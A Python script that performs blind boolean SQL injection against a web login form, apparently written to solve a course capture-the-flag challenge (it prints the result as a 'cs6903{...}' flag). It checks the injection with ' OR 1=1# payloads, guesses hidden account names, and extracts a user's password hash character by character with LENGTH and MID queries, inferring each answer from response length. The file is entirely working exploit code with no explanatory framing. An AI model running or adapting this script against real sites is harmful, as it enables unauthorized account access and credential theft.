import requests
import urllib3
import sys

urllib3.disable_warnings()

if len(sys.argv) < 3:
    print(f"Usage: {sys.argv[0]} <SERVER_IP:PORT> <YOUR_EMAIL>")
    sys.exit(1)

BASE           = f"https://{sys.argv[1]}"
EMAIL          = sys.argv[2]
TRUE_THRESHOLD = 8000   
HEX_CHARSET    = "abcdef0123456789"   
MAX_LENGTH     = 64

HIDDEN_CANDIDATES = ['hidden', 'agent', 'spy', 'rfi', 'lfi',
                     'admin', 'root', 'secret', 'test']

print(f"[*] Target : {BASE}")
print(f"[*] Email  : {EMAIL}\n")
# ──────────────────────────────────────────────────────────────────────────────


def is_true(payload):
    resp = requests.post(
        f"{BASE}/",
        data={"login_email": EMAIL, "login_pass": payload, "login": ""},
        verify=False,
        timeout=20
    )
    return len(resp.text) < TRUE_THRESHOLD


def get_length(column, filter_expr):
    for n in range(0, MAX_LENGTH + 1):
        if is_true(f"' OR ({filter_expr} AND LENGTH({column})={n})#"):
            return n
    return -1


def extract_value(column, filter_expr):
    length = get_length(column, filter_expr)
    if length < 0:
        return None
    print(f"  Length = {length}")

    result = ""
    for pos in range(1, length + 1):
        for ch in HEX_CHARSET:
            if is_true(f"' OR ({filter_expr} AND MID({column},{pos},1)='{ch}')#"):
                result += ch
                break
        else:
            result += "?"
        print(f"\r  Extracting: {result:<50}", end="", flush=True)

    print()
    return result


print("[*] Verifying injection...")
if not is_true("' OR 1=1#") or is_true("' OR 1=0#"):
    print("[!] Injection not confirmed. Check server and email.")
    sys.exit(1)
print("[+] Injection confirmed!\n")


print("[*] Searching for hidden user account...")
hidden_email = None

for candidate in HIDDEN_CANDIDATES:
    if is_true(f"' OR email='{candidate}'#"):
        print(f"[+] Found hidden user: '{candidate}'")
        hidden_email = candidate
        break

if not hidden_email:
    print("[*] No known candidate matched. Trying any user other than self...")


filter_expr = f"email='{hidden_email}'" if hidden_email else f"email!='{EMAIL}'"

print(f"[*] Extracting password for filter: {filter_expr}")
password = extract_value("password", filter_expr)

if password:
    flag = f"cs6903{{{password}}}"
    print(f"\n[+] Password : {password}")
    print(f"[+] FLAG     : {flag}")
else:
    print("[-] Could not extract password. Try checking available users manually.")